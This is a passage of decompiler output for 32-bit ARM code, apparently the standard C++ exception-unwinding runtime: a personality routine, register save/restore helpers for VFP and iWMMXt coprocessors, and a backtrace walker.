  v4 = *(int (__fastcall **)(_DWORD, _DWORD, _DWORD, _DWORD))(a1 + 12);
  v5 = a1;
  v6 = a3;
  v7 = *(_DWORD *)(a2 + 4);
  v8 = *(_DWORD *)(a2 + 8);
  v9 = *(_DWORD *)(v3 + 8);
  v10 = *(_DWORD *)(v3 + 12);
  v3 += 16;
  v29 = v7;
  v30 = v8;
  v31 = v9;
  v32 = v10;
  v11 = *(_DWORD *)v3;
  v12 = *(_DWORD *)(v3 + 4);
  v13 = *(_DWORD *)(v3 + 8);
  v14 = *(_DWORD *)(v3 + 12);
  v3 += 16;
  v33 = v11;
  v34 = v12;
  v35 = v13;
  v36 = v14;
  v15 = *(_DWORD *)v3;
  v16 = *(_DWORD *)(v3 + 4);
  v17 = *(_DWORD *)(v3 + 8);
  v18 = *(_DWORD *)(v3 + 12);
  v3 += 16;
  v37 = v15;
  v38 = v16;
  v39 = v17;
  v40 = v18;
  v19 = *(_DWORD *)(v3 + 4);
  v20 = *(_DWORD *)(v3 + 8);
  v21 = *(_DWORD *)(v3 + 12);
  v22 = 0;
  v41 = *(_DWORD *)v3;
  v42 = v19;
  v43 = v20;
  v44 = v21;
  v28 = 0;
  while ( 1 )
  {
    v23 = sub_9A8C(v5, v44);
    v24 = v6 ? 10 : 9;
    v6 = v23;
    if ( v23 )
    {
      v24 |= 0x10u;
      v25 = v42;
    }
    else
    {
      *(_DWORD *)(v5 + 20) = v44;
      memcpy(&v46, &v28, 0x240u);
      v26 = (*(int (__fastcall **)(signed int, int, char *))(v5 + 16))(v24, v5, &v46);
      v25 = v47;
      v22 = v26;
    }
    v45 = v25;
    if ( v4(1, v24, v5, v5) )
      break;
    if ( v6 )
      return v6;
    memcpy(&v28, &v46, 0x240u);
    if ( v22 != 8 )
    {
      if ( v22 == 7 )
        sub_A850();
      return 9;
    }
  }
  return 9;
}

//----- (00009DE0) --------------------------------------------------------
signed int __fastcall sub_9DE0(int a1, int a2, int a3, int a4, unsigned int a5)
{
  int v5; // r5@1
  int v6; // r4@1
  int v7; // r0@3
  int v8; // r0@6
  unsigned int v9; // r1@6
  unsigned int v10; // r2@6
  int v11; // r3@6

  v5 = a1;
  v6 = a2;
  do
  {
    if ( sub_9A8C(v5, *(_DWORD *)(v6 + 64)) )
      goto LABEL_5;
    *(_DWORD *)(v5 + 20) = *(_DWORD *)(v6 + 64);
    v7 = (*(int (__fastcall **)(signed int, int, int))(v5 + 16))(1, v5, v6);
  }
  while ( v7 == 8 );
  if ( v7 != 7 )
LABEL_5:
    abort();
  sub_A850();
  return sub_9E38(v8, v9, v10, v11, a5);
}

//----- (00009E38) --------------------------------------------------------
signed int __fastcall sub_9E38(int a1, unsigned int a2, unsigned int a3, int a4, unsigned int a5)
{
  signed int result; // r0@3
  char v6; // zf@6
  int v7; // r0@9
  signed int v8; // r3@9

  if ( a2 )
  {
    if ( a2 <= 4 )
      result = 1;
    else
      result = 2;
  }
  else
  {
    v6 = a3 == 15;
    if ( a3 <= 0xF )
      v6 = a4 == 0;
    if ( v6 )
    {
      v7 = a1 + 4 * a3;
      a3 = a5;
      a2 = *(_DWORD *)(v7 + 4);
      v8 = 0;
    }
    else
    {
      v8 = 1;
    }
    if ( v6 )
    {
      *(_DWORD *)a3 = a2;
      result = v8;
    }
    else
    {
      result = 2;
    }
  }
  return result;
}

//----- (00009E7C) --------------------------------------------------------
int __fastcall sub_9E7C(int a1, unsigned int a2, int a3, int a4)
{
  int v5; // [sp+Ch] [bp-Ch]@1

  v5 = a4;
  sub_9E38(a1, 0, a2, 0, (unsigned int)&v5);
  return v5;
}

//----- (00009EA4) --------------------------------------------------------
signed int __fastcall sub_9EA4(signed int result, unsigned int a2, unsigned int a3, int a4, unsigned int a5)
{
  char v5; // zf@6
  signed int v6; // r3@9

  if ( a2 )
  {
    if ( a2 <= 4 )
      result = 1;
    else
      result = 2;
  }
  else
  {
    v5 = a3 == 15;
    if ( a3 <= 0xF )
      v5 = a4 == 0;
    if ( v5 )
    {
      a2 = a5;
      result += 4 * a3;
      v6 = 0;
    }
    else
    {
      v6 = 1;
    }
    if ( v5 )
      *(_DWORD *)(result + 4) = *(_DWORD *)a2;
    else
      result = 2;
    if ( v5 )
      result = v6;
  }
  return result;
}

//----- (00009EE8) --------------------------------------------------------
signed int __fastcall sub_9EE8(signed int a1, unsigned int a2, int a3)
{
  int v4; // [sp+Ch] [bp-Ch]@1

  v4 = a3;
  return sub_9EA4(a1, 0, a2, 0, (unsigned int)&v4);
}

//----- (00009F14) --------------------------------------------------------
signed int __fastcall sub_9F14(char a1, int a2, int a3, int a4)
{
  int v4; // r4@1
  unsigned int *v5; // r7@1
  int v6; // r6@1
  unsigned int v7; // r2@1
  int v8; // r7@1
  unsigned int v9; // t1@1
  int v10; // r8@1
  int v11; // r2@2
  signed int v12; // r3@2
  int v13; // r9@6
  int v14; // r3@9
  int v15; // r11@10
  int v16; // r5@13
  int v17; // r10@14
  int v18; // r7@15
  int v19; // r0@15
  bool v20; // r0@16
  int v21; // r10@18
  int v22; // r0@23
  int v23; // r0@26
  int v24; // r5@26
  signed int v25; // r0@27
  unsigned int v26; // r1@27
  int v27; // r2@27
  int v28; // r3@31
  int v29; // r1@34
  int v30; // r0@42
  int v31; // r7@44
  char v32; // zf@46
  int v33; // r11@49
  int i; // r10@49
  int v35; // r1@51
  int v36; // t1@51
  int v37; // r0@58
  signed int result; // r0@58
  int v39; // r0@63
  int v40; // r7@65
  int v41; // r2@69
  int v42; // r3@69
  int v43; // r0@72
  int v44; // [sp+4h] [bp-44h]@1
  int v45; // [sp+8h] [bp-40h]@8
  int v46; // [sp+Ch] [bp-3Ch]@1
  int v47; // [sp+10h] [bp-38h]@32
  int v48; // [sp+14h] [bp-34h]@2
  int v49; // [sp+18h] [bp-30h]@1
  char v50; // [sp+1Ch] [bp-2Ch]@2
  char v51; // [sp+1Dh] [bp-2Bh]@2

  v4 = a2;
  v5 = *(unsigned int **)(a2 + 76);
  v6 = a3;
  v9 = *v5;
  v8 = (int)(v5 + 1);
  v7 = v9;
  v46 = a1 & 8;
  v10 = a1 & 3;
  v49 = v8;
  v44 = a4;
  if ( a4 )
  {
    v12 = (unsigned __int8)(v7 >> 16);
    v48 = v7 << 16;
    v8 += 4 * v12;
    v11 = 2;
    v51 = v12;
    v50 = 2;
  }
  else
  {
    v11 = v7 << 8;
    v51 = 0;
    v12 = 3;
    v48 = v11;
    v50 = 3;
  }
  if ( v10 == 2 )
    v8 = *(_DWORD *)(a2 + 56);
  v13 = *(_DWORD *)(a2 + 80) & 1;
  if ( !v13 )
  {
    v11 = a2 + 88;
    v45 = a2 + 88;
    while ( 1 )
    {
      while ( 1 )
      {
        v17 = *(_DWORD *)v8;
        if ( !*(_DWORD *)v8 )
          goto LABEL_69;
        v14 = *(_DWORD *)(v4 + 72);
        v15 = v44 == 2 ? *(_DWORD *)(v8 + 4) : *(_WORD *)(v8 + 2);
        if ( v44 == 2 )
        {
          v16 = v8 + 8;
        }
        else
        {
          v17 = *(_WORD *)v8;
          v16 = v8 + 4;
        }
        v18 = (v15 & 0xFFFFFFFE) + v14;
        v19 = sub_9E7C(v6, 0xFu, v44, v14);
        if ( v18 <= (unsigned int)v19 )
        {
          v12 = v17 & 0xFFFFFFFE;
          v20 = v19 < v18 + (v17 & 0xFFFFFFFEu);
        }
        else
        {
          v20 = 0;
        }
        v21 = v17 & 1 | 2 * (v15 & 1);
        if ( v21 == 1 )
          break;
        if ( (unsigned int)v21 < 1 )
        {
          if ( v10 )
            v22 = v20 & 1;
          else
            v22 = 0;
          v8 = v16 + 4;
          if ( v22 )
          {
            v23 = sub_9A74(v16);
            *(_DWORD *)(v4 + 56) = v8;
            v24 = v23;
            if ( !_cxa_begin_cleanup(v4) )
              goto LABEL_74;
            v25 = v6;
            v26 = 15;
            v27 = v24;
LABEL_73:
            sub_9EE8(v25, v26, v27);
            return 7;
          }
        }
        else
        {
          if ( v21 != 2 )
            goto LABEL_74;
          v31 = *(_DWORD *)v16 & 0x7FFFFFFF;
          if ( v10 )
          {
            if ( *(_DWORD *)(v4 + 32) == sub_9E7C(v6, 0xDu, v11, v12) && v16 == *(_DWORD *)(v4 + 40) )
            {
              *(_DWORD *)(v4 + 48) = 4;
              *(_DWORD *)(v4 + 40) = v31;
              *(_DWORD *)(v4 + 44) = 0;
              *(_DWORD *)(v4 + 52) = v16 + 4;
              if ( *(_DWORD *)v16 >= 0 )
              {
                v30 = v16 + 4 * (v31 + 1);
                goto LABEL_63;
              }
              v13 = 1;
            }
          }
          else if ( v20 )
          {
            v11 = v46;
            v32 = v46 == 0;
            if ( v46 )
              v32 = v31 == 0;
            if ( v32 )
            {
              v33 = v16;
              for ( i = 0; i != v31; ++i )
              {
                v36 = *(_DWORD *)(v33 + 4);
                v33 += 4;
                v35 = v36;
                if ( v36 )
                  v35 = *(_DWORD *)(v35 + v33);
                v47 = v45;
                if ( _cxa_type_match(v4, v35, 0, &v47) )
                {
                  if ( i != v31 )
                    goto LABEL_65;
                  break;
                }
              }
LABEL_58:
              v37 = sub_9E7C(v6, 0xDu, v11, v12);
              *(_DWORD *)(v4 + 36) = v47;
              *(_DWORD *)(v4 + 40) = v16;
              *(_DWORD *)(v4 + 32) = v37;
              return 6;
            }
          }
LABEL_65:
          v12 = *(_DWORD *)v16;
          v40 = v31 + 1;
          if ( *(_DWORD *)v16 < 0 )
            v16 += 4;
          v8 = v16 + 4 * v40;
        }
      }
      if ( v10 )
      {
        if ( *(_DWORD *)(v4 + 32) == sub_9E7C(v6, 0xDu, v11, v12) )
        {
          v12 = *(_DWORD *)(v4 + 40);
          if ( v16 == v12 )
          {
            v30 = v16;
LABEL_63:
            v39 = sub_9A74(v30);
            sub_9EE8(v6, 0xFu, v39);
            v25 = v6;
            v26 = 0;
            v27 = v4;
            goto LABEL_73;
          }
        }
      }
      else if ( v20 )
      {
        v11 = *(_DWORD *)v16;
        v28 = *(_DWORD *)(v16 + 4);
        if ( v28 == -2 )
          goto LABEL_74;
        v47 = v45;
        if ( v28 != -1 )
        {
          v29 = v28 ? *(_DWORD *)(v16 + v28 + 4) : 0;
          if ( !_cxa_type_match(v4, v29, (unsigned int)v11 >> 31, &v47) )
            v47 = 0;
        }
        v12 = v47;
        if ( v47 )
          goto LABEL_58;
      }
      v8 = v16 + 8;
    }
  }
  v13 = 0;
LABEL_69:
  if ( sub_AA50(v6, (int)&v48, v11, v12) )
  {
LABEL_74:
    result = 9;
  }
  else
  {
    if ( v13 )
    {
      v43 = sub_9E7C(v6, 0xFu, v41, v42);
      sub_9EE8(v6, 0xEu, v43);
      v25 = v6;
      v26 = 15;
      v27 = (int)&_cxa_call_unexpected;
      goto LABEL_73;
    }
    result = 8;
  }
  return result;
}
// 8948: using guessed type int __fastcall _cxa_begin_cleanup(_DWORD);
// 8954: using guessed type int __fastcall _cxa_type_match(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000A2A8) --------------------------------------------------------
signed int __fastcall sub_A2A8(char a1, int a2, int a3)
{
  return sub_9F14(a1, a2, a3, 2);
}

//----- (0000A2B0) --------------------------------------------------------
signed int __fastcall sub_A2B0(char a1, int a2, int a3)
{
  return sub_9F14(a1, a2, a3, 1);
}

//----- (0000A2B8) --------------------------------------------------------
signed int __fastcall sub_A2B8(char a1, int a2, int a3)
{
  return sub_9F14(a1, a2, a3, 0);
}

//----- (0000A2C0) --------------------------------------------------------
signed int __fastcall sub_A2C0(int a1, int a2, unsigned int a3, int a4)
{
  int v4; // r12@0
  int v5; // r4@1
  unsigned int v6; // r5@1
  int v7; // r7@2
  unsigned int v8; // r7@4
  int v9; // r2@4
  unsigned int v10; // r7@4
  char v11; // zf@5
  int v12; // r0@5
  int v13; // t1@6
  int v14; // r1@13
  char v15; // zf@15
  unsigned int v16; // r6@19
  int v17; // r5@19
  int v18; // r2@19
  signed int v19; // r0@20
  int v20; // r8@23
  bool v21; // r10@23
  int v22; // r2@32
  __int64 v23; // r0@47
  int v24; // r3@47
  int v25; // r5@48
  int v26; // r2@48
  int v27; // t1@49
  char v28; // cf@50
  signed int v29; // r0@54
  int v30; // r10@56
  int v31; // r2@56
  int v32; // t1@57
  unsigned int v33; // r6@69
  int v34; // r5@69
  int v35; // r3@72
  int v36; // r5@72
  int v37; // r2@72
  char *v38; // r6@72
  int v39; // t1@73
  char v40; // zf@76
  int v41; // r2@82
  int v42; // r3@82
  int v43; // t1@84
  int v45; // [sp+0h] [bp-1B8h]@84
  char v46[128]; // [sp+90h] [bp-128h]@72
  char v47[136]; // [sp+110h] [bp-A8h]@48
  char v48; // [sp+198h] [bp-20h]@56

  v5 = a1;
  v6 = a3;
  switch ( a2 )
  {
    case 0:
      if ( a4 )
        return 2;
      v8 = a3 << 16;
      v9 = *(_DWORD *)(a1 + 56);
      v10 = v8 >> 16;
      do
      {
        v12 = v10 & (1 << a4);
        v11 = (v10 & (1 << a4)) == 0;
        if ( v10 & (1 << a4) )
        {
          v12 = v5 + 4 * a4;
          v13 = *(_DWORD *)v9;
          v9 += 4;
          v4 = v13;
        }
        ++a4;
        if ( !v11 )
          *(_DWORD *)(v12 + 4) = v4;
      }
      while ( a4 != 16 );
      v7 = v10 & 0x2000;
      if ( v7 )
        return 0;
      *(_DWORD *)(v5 + 56) = v9;
      return v7;
    case 1:
      v14 = a4 - 5;
      if ( a4 != 5 )
        v14 = 1;
      v15 = a4 == 1;
      if ( a4 != 1 )
        v15 = a4 == 5;
      if ( !v15 )
        return 2;
      v16 = a3 >> 16;
      v17 = (unsigned __int16)a3;
      v18 = (unsigned __int16)a3 + (a3 >> 16);
      v19 = a4 == 1 ? 16 : 32;
      if ( v18 > (unsigned int)v19 )
        return 2;
      v20 = a4 - 1 + ((unsigned int)(a4 - 1) <= 0) - (a4 - 1);
      v21 = v16 > 0xF;
      if ( v21 & v20 )
        return 2;
      if ( v16 > 0xF )
      {
        v21 = v17;
      }
      else if ( (unsigned int)v18 > 0x10 )
      {
        v21 = v18 - 16;
      }
      v7 = v21;
      if ( v21 )
        v7 = 1;
      if ( v7 & v14 )
        return 2;
      if ( v16 <= 0xF )
      {
        v22 = *(_DWORD *)v5;
        if ( *(_DWORD *)v5 & 1 )
        {
          *(_DWORD *)v5 = v22 & 0xFFFFFFFE;
          if ( a4 == 5 )
          {
            *(_DWORD *)v5 = v22 & 0xFFFFFFFE | 2;
            sub_A87C();
          }
          else
          {
            *(_DWORD *)v5 = v22 & 0xFFFFFFFC;
            sub_A86C();
          }
        }
      }
      if ( v7 && *(_DWORD *)v5 & 4 )
      {
        *(_DWORD *)v5 &= 0xFFFFFFFBu;
        sub_A88C();
      }
      if ( v20 )
      {
        sub_A86C();
        if ( !v7 )
          goto LABEL_47;
        goto LABEL_46;
      }
      if ( v16 <= 0xF )
        sub_A87C();
      if ( v7 )
      {
        sub_A88C();
LABEL_46:
        v17 = 16 - v16;
      }
LABEL_47:
      HIDWORD(v23) = *(_DWORD *)(v5 + 56);
      v24 = *(_DWORD *)(v5 + 56);
      if ( v17 > 0 )
      {
        v25 = 2 * v17;
        LODWORD(v23) = &v47[8 * v16];
        v26 = v25;
        while ( 1 )
        {
          v28 = (unsigned int)v26-- >= 1;
          if ( !v28 )
            break;
          v27 = *HIDWORD(v23);
          HIDWORD(v23) += 4;
          *(_DWORD *)v23 = v27;
          LODWORD(v23) = v23 + 4;
        }
        v24 += 4 * v25;
      }
      if ( v7 )
      {
        if ( v16 < 0x10 )
          v29 = 16;
        else
          v29 = v16;
        v30 = 2 * v21;
        LODWORD(v23) = &v48 + 8 * v29 - 520;
        HIDWORD(v23) = v24;
        v31 = v30;
        while ( 1 )
        {
          v28 = (unsigned int)v31-- >= 1;
          if ( !v28 )
            break;
          v32 = *HIDWORD(v23);
          HIDWORD(v23) += 4;
          *(_DWORD *)v23 = v32;
          LODWORD(v23) = v23 + 4;
        }
        v24 += 4 * v30;
      }
      if ( v20 )
        v24 += 4;
      *(_DWORD *)(v5 + 56) = v24;
      if ( v20 )
      {
        LODWORD(v23) = v47;
        sub_A864(v23);
        return 0;
      }
      if ( v16 <= 0xF )
      {
        LODWORD(v23) = v47;
        sub_A874(v23);
      }
      if ( v7 )
      {
        sub_A884();
        return 0;
      }
      return v7;
    case 2:
      return 1;
    case 3:
      if ( a4 != 3 )
        return 2;
      v33 = a3 >> 16;
      v34 = (unsigned __int16)a3;
      if ( (unsigned __int16)a3 + (a3 >> 16) > 0x10 )
        return 2;
      if ( *(_DWORD *)a1 & 8 )
      {
        *(_DWORD *)a1 &= 0xFFFFFFF7u;
        sub_A8D8();
      }
      sub_A8D8();
      v35 = *(_DWORD *)(v5 + 56);
      v36 = 2 * v34;
      v37 = *(_DWORD *)(v5 + 56);
      v38 = &v46[8 * v33];
      v7 = v36;
      while ( v7 )
      {
        v39 = *(_DWORD *)v35;
        v35 += 4;
        --v7;
        *(_DWORD *)v38 = v39;
        v38 += 4;
      }
      *(_DWORD *)(v5 + 56) = v37 + 4 * v36;
      sub_A894((int)v46);
      return v7;
    case 4:
      v40 = a3 == 16;
      if ( a3 <= 0x10 )
        v40 = a4 == 0;
      if ( !v40 )
        return 2;
      if ( *(_DWORD *)a1 & 0x10 )
      {
        *(_DWORD *)a1 &= 0xFFFFFFEFu;
        sub_A930();
      }
      sub_A930();
      v41 = *(_DWORD *)(v5 + 56);
      v42 = 0;
      do
      {
        if ( v6 & (1 << v42) )
        {
          v43 = *(_DWORD *)v41;
          v41 += 4;
          *(&v45 + v42) = v43;
        }
        ++v42;
      }
      while ( v42 != 4 );
      *(_DWORD *)(v5 + 56) = v41;
      sub_A91C((int)&v45);
      return 0;
    default:
      return 2;
  }
}
// A2C0: using guessed type char var_A8[136];
// A2C0: using guessed type char var_128[128];

//----- (0000A620) --------------------------------------------------------
signed int __fastcall sub_A620(int a1, int a2)
{
  int v2; // lr@1
  int v3; // r5@1
  int v4; // r4@1
  int v5; // r0@1
  int v6; // r1@1
  int v7; // r2@1
  int v8; // r3@1
  int v9; // r0@1
  int v10; // r1@1
  int v11; // r2@1
  int v12; // r3@1
  int v13; // r0@1
  int v14; // r1@1
  int v15; // r2@1
  int v16; // r3@1
  int v17; // r1@1
  int v18; // r2@1
  int v19; // r3@1
  __int64 v20; // r0@3
  int v21; // r7@3
  int v22; // r2@4
  int v23; // r3@4
  unsigned int v25; // [sp+0h] [bp-258h]@1
  int v26; // [sp+4h] [bp-254h]@1
  int v27; // [sp+8h] [bp-250h]@1
  int v28; // [sp+Ch] [bp-24Ch]@1
  int v29; // [sp+10h] [bp-248h]@1
  int v30; // [sp+14h] [bp-244h]@1
  int v31; // [sp+18h] [bp-240h]@1
  int v32; // [sp+1Ch] [bp-23Ch]@1
  int v33; // [sp+20h] [bp-238h]@1
  int v34; // [sp+24h] [bp-234h]@1
  int v35; // [sp+28h] [bp-230h]@1
  int v36; // [sp+2Ch] [bp-22Ch]@1
  int v37; // [sp+30h] [bp-228h]@1
  int v38; // [sp+34h] [bp-224h]@1
  int v39; // [sp+38h] [bp-220h]@1
  int v40; // [sp+3Ch] [bp-21Ch]@1
  int v41; // [sp+40h] [bp-218h]@1

  v2 = a2 + 4;
  *(_DWORD *)(a2 + 64) = *(_DWORD *)(a2 + 60);
  v3 = a1;
  v4 = a2;
  v5 = *(_DWORD *)(a2 + 4);
  v6 = *(_DWORD *)(a2 + 8);
  v7 = *(_DWORD *)(v2 + 8);
  v8 = *(_DWORD *)(v2 + 12);
  v2 += 16;
  v26 = v5;
  v27 = v6;
  v28 = v7;
  v29 = v8;
  v9 = *(_DWORD *)v2;
  v10 = *(_DWORD *)(v2 + 4);
  v11 = *(_DWORD *)(v2 + 8);
  v12 = *(_DWORD *)(v2 + 12);
  v2 += 16;
  v30 = v9;
  v31 = v10;
  v32 = v11;
  v33 = v12;
  v13 = *(_DWORD *)v2;
  v14 = *(_DWORD *)(v2 + 4);
  v15 = *(_DWORD *)(v2 + 8);
  v16 = *(_DWORD *)(v2 + 12);
  v2 += 16;
  v34 = v13;
  v35 = v14;
  v36 = v15;
  v37 = v16;
  v17 = *(_DWORD *)(v2 + 4);
  v18 = *(_DWORD *)(v2 + 8);
  v19 = *(_DWORD *)(v2 + 12);
  v38 = *(_DWORD *)v2;
  v39 = v17;
  v40 = v18;
  v41 = v19;
  v25 = -1;
  while ( !sub_9A8C(v3, v41) )
  {
    v21 = (*(int (**)(void))(v3 + 16))();
    if ( v21 != 8 )
    {
      LODWORD(v20) = &v25;
      sub_9C60(v20);
      if ( v21 == 6 )
        sub_9DE0(v3, v4, v22, v23, v25);
      return 9;
    }
  }
  return 9;
}

//----- (0000A6C4) --------------------------------------------------------
signed int __fastcall sub_A6C4(int a1, int a2, int a3, int a4)
{
  int v4; // r2@1

  *(_DWORD *)(a1 + 24) = a3;
  v4 = *(_DWORD *)(a4 + 60);
  *(_DWORD *)(a1 + 12) = a2;
  *(_DWORD *)(a4 + 64) = v4;
  return sub_9CCC(a1, a4, 0);
}

//----- (0000A6E0) --------------------------------------------------------
void __fastcall sub_A6E0(int a1, int a2, int a3, unsigned int a4)
{
  int v4; // r4@1
  int v5; // r5@1
  int v6; // r0@3
  int v7; // r2@3
  int v8; // r3@3
  unsigned int v9; // [sp+0h] [bp-10h]@1

  v9 = a4;
  *(_DWORD *)(a2 + 64) = *(_DWORD *)(a1 + 20);
  v4 = a1;
  v5 = a2;
  if ( *(_DWORD *)(a1 + 12) )
  {
    sub_9CCC(a1, a2, 1);
    goto LABEL_8;
  }
  v6 = (*(int (__fastcall **)(signed int, int, int))(a1 + 16))(2, a1, a2);
  if ( v6 == 7 )
  {
    sub_A850();
  }
  else if ( v6 != 8 )
  {
    goto LABEL_8;
  }
  sub_9DE0(v4, v5, v7, v8, v9);
LABEL_8:
  abort();
}

//----- (0000A74C) --------------------------------------------------------
signed int __fastcall sub_A74C(int a1, int a2)
{
  signed int result; // r0@2

  if ( *(_DWORD *)(a1 + 12) )
  {
    *(_DWORD *)(a2 + 64) = *(_DWORD *)(a2 + 60);
    result = sub_9CCC(a1, a2, 0);
  }
  else
  {
    result = sub_A620(a1, a2);
  }
  return result;
}

//----- (0000A790) --------------------------------------------------------
signed int __fastcall sub_A790(int (__fastcall *a1)(_DWORD, _DWORD), int a2, int a3)
{
  int v3; // lr@1
  int (__fastcall *v4)(_DWORD, _DWORD); // r5@1
  int v5; // r4@1
  int v6; // r0@1
  int v7; // r1@1
  int v8; // r2@1
  int v9; // r3@1
  int v10; // r0@1
  int v11; // r1@1
  int v12; // r2@1
  int v13; // r3@1
  int v14; // r0@1
  int v15; // r1@1
  int v16; // r2@1
  int v17; // r3@1
  int v18; // r1@1
  int v19; // r2@1
  int v20; // r3@1
  __int64 v21; // r0@2
  char v22; // zf@4
  signed int v23; // r6@6
  int v25; // [sp+0h] [bp-2A8h]@2
  int (__fastcall *v26)(signed int, int *, int *); // [sp+10h] [bp-298h]@4
  int v27; // [sp+58h] [bp-250h]@1
  int v28; // [sp+5Ch] [bp-24Ch]@1
  int v29; // [sp+60h] [bp-248h]@1
  int v30; // [sp+64h] [bp-244h]@1
  int v31; // [sp+68h] [bp-240h]@1
  int v32; // [sp+6Ch] [bp-23Ch]@1
  int v33; // [sp+70h] [bp-238h]@1
  int v34; // [sp+74h] [bp-234h]@1
  int v35; // [sp+78h] [bp-230h]@1
  int v36; // [sp+7Ch] [bp-22Ch]@1
  int v37; // [sp+80h] [bp-228h]@1
  int v38; // [sp+84h] [bp-224h]@1
  int v39; // [sp+88h] [bp-220h]@1
  int v40; // [sp+8Ch] [bp-21Ch]@1
  int v41; // [sp+90h] [bp-218h]@1
  int v42; // [sp+94h] [bp-214h]@1
  int v43; // [sp+98h] [bp-210h]@1

  v3 = a3 + 4;
  *(_DWORD *)(a3 + 64) = *(_DWORD *)(a3 + 60);
  v4 = a1;
  v5 = a2;
  v6 = *(_DWORD *)(a3 + 4);
  v7 = *(_DWORD *)(a3 + 8);
  v8 = *(_DWORD *)(a3 + 12);
  v9 = *(_DWORD *)(v3 + 12);
  v3 += 16;
  v28 = v6;
  v29 = v7;
  v30 = v8;
  v31 = v9;
  v10 = *(_DWORD *)v3;
  v11 = *(_DWORD *)(v3 + 4);
  v12 = *(_DWORD *)(v3 + 8);
  v13 = *(_DWORD *)(v3 + 12);
  v3 += 16;
  v32 = v10;
  v33 = v11;
  v34 = v12;
  v35 = v13;
  v14 = *(_DWORD *)v3;
  v15 = *(_DWORD *)(v3 + 4);
  v16 = *(_DWORD *)(v3 + 8);
  v17 = *(_DWORD *)(v3 + 12);
  v3 += 16;
  v36 = v14;
  v37 = v15;
  v38 = v16;
  v39 = v17;
  v18 = *(_DWORD *)(v3 + 4);
  v19 = *(_DWORD *)(v3 + 8);
  v20 = *(_DWORD *)(v3 + 12);
  v40 = *(_DWORD *)v3;
  v41 = v18;
  v42 = v19;
  v43 = v20;
  v27 = -1;
  while ( !sub_9A8C((int)&v25, v43) )
  {
    sub_9EE8((signed int)&v27, 0xCu, (int)&v25);
    if ( v4(&v27, v5) )
      break;
    LODWORD(v21) = v26(8, &v25, &v27);
    v22 = (_DWORD)v21 == 9;
    if ( (_DWORD)v21 != 9 )
      v22 = (_DWORD)v21 == 5;
    v23 = v21;
    if ( v22 )
      goto LABEL_10;
  }
  v23 = 9;
LABEL_10:
  LODWORD(v21) = &v27;
  sub_9C60(v21);
  return v23;
}

//----- (0000A850) --------------------------------------------------------
void __fastcall sub_A850()
{
  int v0; // [sp+8h] [bp-4h]@0

  JUMPOUT(__CS__, v0);
}

//----- (0000A864) --------------------------------------------------------
int __fastcall sub_A864(__int64 _R0)
{
  __asm { FLDMIAX R0, {D0-D15} }
  return _R0;
}

//----- (0000A86C) --------------------------------------------------------
__int64 __fastcall sub_A86C()
{
  __int64 result; // r0@1

  __asm { FSTMIAX R0, {D0-D15} }
  return result;
}

//----- (0000A874) --------------------------------------------------------
int __fastcall sub_A874(__int64 _R0)
{
  __asm { FLDMIAD R0, {D0-D15} }
  return _R0;
}

//----- (0000A87C) --------------------------------------------------------
__int64 __fastcall sub_A87C()
{
  __int64 result; // r0@1

  __asm { FSTMIAD R0, {D0-D15} }
  return result;
}

//----- (0000A884) --------------------------------------------------------
void __fastcall sub_A884()
{
  __asm { LDCL    p11, c0, [R0], {0x20} }
}

//----- (0000A88C) --------------------------------------------------------
void __fastcall sub_A88C()
{
  __asm { STCL    p11, c0, [R0], {0x20} }
}

//----- (0000A894) --------------------------------------------------------
int __fastcall sub_A894(int a1)
{
  int v5; // r0@1
  int result; // r0@1

  _T1 = *(_DWORD *)a1;
  v5 = a1 + 8;
  __asm { LDCL    p1, c0, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c1, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c2, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c3, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c4, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c5, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c6, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c7, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c8, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c9, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c10, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c11, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c12, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c13, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  v5 += 8;
  __asm { LDCL    p1, c14, [R0],#8 }
  _T1 = *(_DWORD *)v5;
  result = v5 + 8;
  __asm { LDCL    p1, c15, [R0],#8 }
  return result;
}

//----- (0000A8D8) --------------------------------------------------------
void __fastcall sub_A8D8()
{
  __asm
  {
    STCL    p1, c0, [R0],#8
    STCL    p1, c1, [R0],#8
    STCL    p1, c2, [R0],#8
    STCL    p1, c3, [R0],#8
    STCL    p1, c4, [R0],#8
    STCL    p1, c5, [R0],#8
    STCL    p1, c6, [R0],#8
    STCL    p1, c7, [R0],#8
    STCL    p1, c8, [R0],#8
    STCL    p1, c9, [R0],#8
    STCL    p1, c10, [R0],#8
    STCL    p1, c11, [R0],#8
    STCL    p1, c12, [R0],#8
    STCL    p1, c13, [R0],#8
    STCL    p1, c14, [R0],#8
    STCL    p1, c15, [R0],#8
  }
}

//----- (0000A91C) --------------------------------------------------------
int __fastcall sub_A91C(int a1)
{
  int v5; // r0@1
  int result; // r0@1

  _T1 = *(_DWORD *)a1;
  v5 = a1 + 4;
  __asm { LDC2    p1, c8, [R0],#4 }
  _T1 = *(_DWORD *)v5;
  v5 += 4;
  __asm { LDC2    p1, c9, [R0],#4 }
  _T1 = *(_DWORD *)v5;
  v5 += 4;
  __asm { LDC2    p1, c10, [R0],#4 }
  _T1 = *(_DWORD *)v5;
  result = v5 + 4;
  __asm { LDC2    p1, c11, [R0],#4 }
  return result;
}

//----- (0000A930) --------------------------------------------------------
void __fastcall sub_A930()
{
  __asm
  {
    STC2    p1, c8, [R0],#4
    STC2    p1, c9, [R0],#4
    STC2    p1, c10, [R0],#4
    STC2    p1, c11, [R0],#4
  }
